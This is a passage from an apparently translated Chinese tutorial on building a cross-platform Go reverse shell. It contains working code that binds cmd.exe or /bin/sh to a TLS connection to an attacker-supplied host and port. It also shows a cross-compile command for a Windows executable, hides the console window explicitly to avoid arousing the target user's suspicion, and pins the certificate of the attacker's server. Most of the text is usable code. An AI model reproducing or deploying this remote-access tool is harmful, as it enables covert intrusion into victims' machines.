    }
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
    }
很明显，我们在这里添加了一个switch条件来处理GOOS不同的值。因此，我们可以直接检查不同操作系统平台的值，并针对平台情况来修改目标进程。
需要注意的是，上述代码还可以进一步简化，因为/bin/sh目录一般不会出现在Windows操作系统之中：
    switch runtime.GOOS {
    case “windows”:
    // Windows specific branch
    cmd = exec.Command(“cmd.exe”)
    default:
    // any other OS
    cmd = exec.Command(“/bin/sh”)
    }
现在，我们还要使用GOARCH来处理交叉编译：
    $ make GOOS=windows GOARCH=amd64 LHOST=192.168.0.23 LPORT=2233
    go build —ldflags “-X main.connectString=192.168.0.23:2233” -o reverse_shell tcp_multi.go
    $ file reverse_shell
    reverse_shell: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows
## 网络加密
现在，我们看一看如何实现网络流量的加密。
我们现在有下列选项可以选择：
  1. 使用现成的方法在应用层实现加密；
  2. 在会话层使用常见的经过测试的协议来实现加密（TLS）；
出于简单和安全这两个角度来考虑，我们选择TLS，因为它可以用Go语言轻松实现，而且其标准代码库已经完全支持启用TLS了。
在客户端方面，我们还需要一种新的&tls.Config类型对象来配置通信链接，例如证书绑定等等。
下面给出的是经过优化并配置了TLS的新的基础代码：
    import (
    “crypto/tls”
    “runtime”
    “os”
    “os/exec”
    “net”
    )
    var connectString string
    func GetShell(conn net.Conn) {
    var cmd *exec.Cmd
    switch runtime.GOOS {
    case “windows”:
    cmd = exec.Command(“cmd.exe”)
    default:
    cmd = exec.Command(“/bin/sh”)
    }
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Stdin = conn
    cmd.Run()
    }
    func Reverse(connectString string) {
    var (
    conn tls.Conn
    err error
    )
    // Creation of the tls.Config object
    // Accepting any* server certificate
    config := &tls.Config{InsecureSkipVerify: true}
    if conn, err = tls.Dial(“tcp”, connectString, config); err != nil {
    os.Exit(-1)
    }
    defer conn.Close()
    // Starting the shell
    GetShell(conn)
    }
    func main() {
    if len(connectString) == 0 {
    os.Exit(1)
    }
    Reverse(connectString)
    }
正如之前所说的那样，创建一个TLS套接字跟创建一个简单的TCP套接字其实是非常相似的，而且tls.Conn对象跟net.Coon的使用模式基本相同。
## 条件编译
正如之前所示，我们可以根据目标操作系统来修改程序的执行方式。但是，如果你想尝试使用这份代码的话，你就会发现一个问题。cmd.exe窗口并不会隐藏，而是直接弹出来了，而这就会引起目标用户的怀疑。
幸运的是，exec.Cmd对象的SysProcAttr选项能够改变这种行为方式，正如文档库中所介绍的那样：
    $ go doc exec.Cmd
    ...
    // SysProcAttr holds optional, operating system-specific attributes.
    // Run passes it to os.StartProcess as the os.ProcAttr's Sys field.
    SysProcAttr *syscall.SysProcAttr
    ...
在Linux下，我们从syscall.SysProcAttr模块的文档中获取到了下列信息：
    $ go doc syscall.SysProcAttr
    type SysProcAttr struct {
    Chroot string // Chroot.
    Credential *Credential // Credential.
    Ptrace bool // Enable tracing.
    Setsid bool // Create session.
    Setpgid bool // Set process group ID to Pgid, or, if Pgid == 0, to new pid.
    Setctty bool // Set controlling terminal to fd Ctty (only meaningful if Setsid is set)
    Noctty bool // Detach fd 0 from controlling terminal
    Ctty int // Controlling TTY fd
    Foreground bool // Place child's process group in foreground. (Implies Setpgid. Uses Ctty as fd of controlling TTY)
    Pgid int // Child's process group ID if Setpgid.
    Pdeathsig Signal // Signal that the process will get when its parent dies (Linux only)
    Cloneflags uintptr // Flags for clone calls (Linux only)
    Unshareflags uintptr // Flags for unshare calls (Linux only)
    UidMappings []SysProcIDMap // User ID mappings for user namespaces.
    GidMappings []SysProcIDMap // Group ID mappings for user namespaces.
    // GidMappingsEnableSetgroups enabling setgroups syscall.
    // If false, then setgroups syscall will be disabled for the child process.
    // This parameter is no-op if GidMappings == nil. Otherwise for unprivileged
    // users this should be set to false for mappings work.
    GidMappingsEnableSetgroups bool
    }
修改后的代码如下：
    ...
    switch runtime.GOOS {
    case "windows":
    cmd := exec.Cmd("cmd.exe")
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    default:
    cmd := exec.Cmd("/bin/sh")
    }
    ...
不过上述代码还不适用于Windows以外的平台，因为syscall/exec_linux.go中并没有HideWindows属性。
因此，我们还需要使用条件编译来调整我们的项目代码。
比如说，如果我们想要针对Windows平台来编译源文件，我们就要添加下列代码：
    // +build windows !linux !darwin !freebsd
    import net
    …
项目结构如下所示：
    $ tree
    ├── hershell.go
    ├── Makefile
    ├── README.md
    └── shell
    ├── shell_default.go
    └── shell_windows.go
其中，hershell.go中包含了程序的核心代码。接下来，我们需要创建一个名叫shell的模块，其中包含有针对Linux和Unix的shell_default.go文件以及针对Windows的shell_windows.go文件。
## 证书绑定
使用TLS来加密通信链接其实是非常好的，但如果没有对服务器进行认证的话，流量仍然有可能被“中间人攻击“等方式拦截到的。
为了防止这种攻击的发生，我们需要对服务器提供的证书进行验证，即所谓的“证书绑定“。
下列函数实现了这种功能：
    func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
    valid := false
    connState := conn.ConnectionState()
    for _, peerCert := range connState.PeerCertificates {
    hash := sha256.Sum256(peerCert.Raw)
    if bytes.Compare(hash[0:], fingerprint) == 0 {
    valid = true
    }
    }
    return valid, nil
    }
我们只需要在程序与远程服务器进行连接时调用这份代码即可，如果证书无效的话，连接将会被关闭：
    func Reverse(connectString string, fingerprint []byte) {
    var (
    conn *tls.Conn
    err error
    )
    config := &tls.Config{InsecureSkipVerify: true}
    if conn, err = tls.Dial(“tcp”, connectString, config); err != nil {
    os.Exit(ERR_HOST_UNREACHABLE)
    }
        defer conn.Close()
        // checking the certificate fingerprint
        if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
                os.Exit(ERR_BAD_FINGERPRINT)
        }
        RunShell(conn)
    }
## 总结
本文的目标是给大家展示Go语言提供给我们的实用性以及便捷性。它不仅提供了跨平台特性，而且还整合了大量实用工具。除此之外，社区还有大量的数据包以及代码库可以使用，这一点是本文没有提到的。
你可以在我们的GitHub代码库【传送门】获取本项目的完整源代码，如果你有任何问题的话，欢迎在GitHub上留言。